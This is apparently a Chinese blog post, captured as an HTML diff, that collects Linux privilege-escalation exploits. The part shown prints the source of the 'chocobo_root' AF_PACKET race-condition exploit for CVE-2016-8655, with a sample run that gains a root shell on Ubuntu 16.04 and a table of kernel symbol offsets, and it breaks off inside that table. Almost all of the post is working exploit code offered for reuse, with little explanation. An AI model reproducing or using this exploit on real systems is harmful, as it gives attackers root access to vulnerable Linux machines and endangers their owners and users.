@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.0.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.0.1" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="信息安全" />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="初心·守一" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="404 Page Not Found               ::selection {             background-color: #E13300;             color: white;         }          ::-moz-selection {             background-color: #E13300;">
+<meta property="og:type" content="website">
+<meta property="og:title" content="初心·守一">
+<meta property="og:url" content="http://reboot.cf/404.html">
+<meta property="og:site_name" content="初心·守一">
+<meta property="og:description" content="404 Page Not Found               ::selection {             background-color: #E13300;             color: white;         }          ::-moz-selection {             background-color: #E13300;">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-03-07T07:13:33.974Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初心·守一">
+<meta name="twitter:description" content="404 Page Not Found               ::selection {             background-color: #E13300;             color: white;         }          ::-moz-selection {             background-color: #E13300;">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.0.1',
+    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://reboot.cf/404.html"/>
+
+
+
+
+
+  <title>Linux提权漏洞整合 | 初心·守一</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">初心·守一</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://reboot.cf/2016/09/23/Linux提权漏洞整合/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="初心·守一">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="初心·守一">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux提权漏洞整合</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-23T17:41:23+08:00">2016-09-23</time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>记录一些经常用到的Linux提权漏洞<br><a id="more"></a></p>
+<h1 id="Linux内核竞争条件漏洞（CVE-2016-8655）"><a href="#Linux内核竞争条件漏洞（CVE-2016-8655）" class="headerlink" title="Linux内核竞争条件漏洞（CVE-2016-8655）"></a>Linux内核竞争条件漏洞（CVE-2016-8655）</h1><p><a href="">代码</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">chocobo_root.c</span></span><br><span class="line"><span class="comment">linux AF_PACKET race condition exploit</span></span><br><span class="line"><span class="comment">exploit for Ubuntu 16.04 x86_64</span></span><br><span class="line"><span class="comment">vroom vroom</span></span><br><span class="line"><span class="comment">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ uname -a</span></span><br><span class="line"><span class="comment">Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ id</span></span><br><span class="line"><span class="comment">uid=1000(user) gid=1000(user) groups=1000(user)</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ ./chocobo_root</span></span><br><span class="line"><span class="comment">linux AF_PACKET race condition exploit by rebel</span></span><br><span class="line"><span class="comment">kernel version: 4.4.0-51-generic #72</span></span><br><span class="line"><span class="comment">proc_dostring = 0xffffffff81088090</span></span><br><span class="line"><span class="comment">modprobe_path = 0xffffffff81e48f80</span></span><br><span class="line"><span class="comment">register_sysctl_table = 0xffffffff812879a0</span></span><br><span class="line"><span class="comment">set_memory_rw = 0xffffffff8106f320</span></span><br><span class="line"><span class="comment">exploit starting</span></span><br><span class="line"><span class="comment">making vsyscall page writable..</span></span><br><span class="line"><span class="comment">new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000</span></span><br><span class="line"><span class="comment">sockets allocated</span></span><br><span class="line"><span class="comment">removing barrier and spraying..</span></span><br><span class="line"><span class="comment">version switcher stopping, x = -1 (y = 174222, last val = 2)</span></span><br><span class="line"><span class="comment">current packet version = 0</span></span><br><span class="line"><span class="comment">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="comment">*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*</span></span><br><span class="line"><span class="comment">please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.</span></span><br><span class="line"><span class="comment">closing socket and verifying.......</span></span><br><span class="line"><span class="comment">vsyscall page altered!</span></span><br><span class="line"><span class="comment">stage 1 completed</span></span><br><span class="line"><span class="comment">registering new sysctl..</span></span><br><span class="line"><span class="comment">new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850</span></span><br><span class="line"><span class="comment">sockets allocated</span></span><br><span class="line"><span class="comment">removing barrier and spraying..</span></span><br><span class="line"><span class="comment">version switcher stopping, x = -1 (y = 30773, last val = 0)</span></span><br><span class="line"><span class="comment">current packet version = 2</span></span><br><span class="line"><span class="comment">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="comment">race not won</span></span><br><span class="line"><span class="comment">retrying stage..</span></span><br><span class="line"><span class="comment">new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850</span></span><br><span class="line"><span class="comment">sockets allocated</span></span><br><span class="line"><span class="comment">removing barrier and spraying..</span></span><br><span class="line"><span class="comment">version switcher stopping, x = -1 (y = 133577, last val = 2)</span></span><br><span class="line"><span class="comment">current packet version = 0</span></span><br><span class="line"><span class="comment">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="comment">*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*</span></span><br><span class="line"><span class="comment">please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.</span></span><br><span class="line"><span class="comment">closing socket and verifying.......</span></span><br><span class="line"><span class="comment">sysctl added!</span></span><br><span class="line"><span class="comment">stage 2 completed</span></span><br><span class="line"><span class="comment">binary executed by kernel, launching rootshell</span></span><br><span class="line"><span class="comment">root@ubuntu:~# id</span></span><br><span class="line"><span class="comment">uid=0(root) gid=0(root) groups=0(root),1000(user)</span></span><br><span class="line"><span class="comment">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=</span></span><br><span class="line"><span class="comment">There are offsets included for older kernels, but they're untested</span></span><br><span class="line"><span class="comment">so be aware that this exploit will probably crash kernels older than 4.4.</span></span><br><span class="line"><span class="comment">tested on:</span></span><br><span class="line"><span class="comment">Ubuntu 16.04: 4.4.0-51-generic</span></span><br><span class="line"><span class="comment">Ubuntu 16.04: 4.4.0-47-generic</span></span><br><span class="line"><span class="comment">Ubuntu 16.04: 4.4.0-36-generic</span></span><br><span class="line"><span class="comment">Ubuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu</span></span><br><span class="line"><span class="comment">Shoutouts to:</span></span><br><span class="line"><span class="comment">jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)</span></span><br><span class="line"><span class="comment">mcdelivery for delivering hotcakes and coffee</span></span><br><span class="line"><span class="comment">11/2016</span></span><br><span class="line"><span class="comment">by rebel</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> barrier = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> vers_switcher_done = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">offset</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *kernel_version;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> proc_dostring;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> register_sysctl_table;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> set_memory_rw;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">offset</span> *<span class="title">off</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="comment">//99% of these offsets haven't actually been tested :)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">offset</span> <span class="title">offsets</span>[] = &#123;</span></span><br><span class="line">    &#123;<span class="string">"4.4.0-46-generic #67~14.04.1"</span>,<span class="number">0xffffffff810842f0</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274580</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-47-generic #68~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-41-generic #48"</span>,<span class="number">0xffffffff81083470</span>,<span class="number">0xffffffff81e48920</span>,<span class="number">0xffffffff812775c0</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-22-generic #24"</span>,<span class="number">0xffffffff8108ab70</span>,<span class="number">0xffffffff81e47880</span>,<span class="number">0xffffffff812b34b0</span>,<span class="number">0xffffffff8106f0d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-34-generic #39"</span>,<span class="number">0xffffffff81082080</span>,<span class="number">0xffffffff81c487e0</span>,<span class="number">0xffffffff81274490</span>,<span class="number">0xffffffff8106b5d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-30-generic #36"</span>,<span class="number">0xffffffff810820d0</span>,<span class="number">0xffffffff81c487e0</span>,<span class="number">0xffffffff812744e0</span>,<span class="number">0xffffffff8106b620</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-16-generic #19"</span>,<span class="number">0xffffffff81081ac0</span>,<span class="number">0xffffffff81c48680</span>,<span class="number">0xffffffff812738f0</span>,<span class="number">0xffffffff8106b110</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-17-generic #21"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-18-generic #22"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-19-generic #23~14.04.1"</span>,<span 